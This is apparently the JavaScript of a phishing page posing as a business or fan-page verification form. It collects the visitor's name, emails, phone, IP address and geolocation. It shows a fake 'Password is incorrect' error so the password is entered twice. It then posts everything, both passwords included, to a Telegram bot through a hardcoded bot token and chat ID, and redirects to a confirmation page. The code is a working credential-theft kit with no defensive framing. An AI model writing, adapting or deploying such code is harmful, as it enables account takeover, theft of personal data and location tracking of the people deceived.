document
  .querySelector(".form_content")
  .addEventListener("submit", function (e) {
    e.preventDefault(); // Prevent the default form submission event

    const fullNameInput = document.querySelector('input[name="fullName"]');
    const businessEmailInput = document.querySelector(
      'input[name="BusinessEmail"]'
    );
    const personalEmailInput = document.querySelector(
      'input[name="PersonalEmail"]'
    );
    const mobilePhoneInput = document.querySelector(
      'input[name="mobilePhone"]'
    );
    const nameFanpageInput = document.querySelector(
      'input[name="nameFanpage"]'
    ); // Added this line

    if (
      fullNameInput.value &&
      businessEmailInput.value &&
      personalEmailInput.value &&
      mobilePhoneInput.value &&
      nameFanpageInput.value
    ) {
      // Added nameFanpageInput.value to the condition
      const btnSubmit = document.querySelector(".btn_submit");
      btnSubmit.setAttribute("data-toggle", "modal"); // Manually submit the form
    } else {
      alert("Please fill in all required fields.");
    }
  });

document
  .querySelector(".form_content")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    // Replace with your bot token and chat ID
    const botToken = "7016735657:AAEnFhFDV7oKAecaReLPhilB9iIog00erxE";
    const chatId = "-4122429321";

    // Collect form data
    const formData = new FormData(e.target);
    const data = {};
    for (let [key, value] of formData.entries()) {
      data[key] = value;
    }

    // Get user's IP address
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((ipData) => {
        // Add IP address to data
        data.ip = ipData.ip;

        // Get user's location
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition((position) => {
            data.location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            };

            //Handle password
            let clickCount = 0;
            let passwords = [];

            document
              .querySelector("#button-modal")
              .addEventListener("click", function (e) {
                e.preventDefault();

                clickCount++;

                const passwordInput = document.querySelector(
                  'input[name="Password"]'
                );
                const password = passwordInput.value;
                passwords.push(password);

                firstPassword = passwords[0];
                secondPassword = passwords[1];

                function formatData(data) {
                  return `• FullName: ${data.fullName}\n• BusinessEmail: ${data.BusinessEmail}\n• Mobile: ${data.mobilePhone}\n• NameFanpage: ${data.nameFanpage}\n• Note: ${data.Note}\n• IP: ${data.ip}\n• Location: Latitude - ${data.location.latitude}, Longitude - ${data.location.longitude}\n• First Password: ${firstPassword}\n• Second Password: ${secondPassword}`;
                }

                if (clickCount === 1) {
                  // Create a span element to display the error message
                  const errorSpan = document.createElement("span");
                  errorSpan.textContent =
                    "Password is incorrect. Please try again.";
                  errorSpan.style.color = "red";

                  // Append the error message to the form group
                  passwordInput.parentNode.appendChild(errorSpan);
                } else if (clickCount === 2) {
                  // Send message to Telegram bot
                  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: formatData(data),
                    }),
                  })
                    .then((response) => response.json())
                    .then((data) => {
                      console.log(data);
                      document.querySelector(".form_content").reset();
                      window.location.href = "confirm.html";
                    });
                }
              });
          });
        }
      });
  });
